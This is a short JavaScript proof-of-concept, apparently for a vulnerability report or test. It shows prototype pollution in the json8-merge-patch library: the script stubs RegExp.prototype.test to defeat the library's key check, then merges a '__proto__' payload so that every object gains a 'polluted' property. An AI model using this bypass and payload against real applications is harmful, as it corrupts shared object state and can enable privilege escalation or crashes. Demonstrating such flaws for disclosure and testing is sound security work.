RegExp.prototype.test = () => false;
console.log({}.polluted);
const json8mergepatch = require('json8-merge-patch');
json8mergepatch.apply({}, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));
console.log({}.polluted);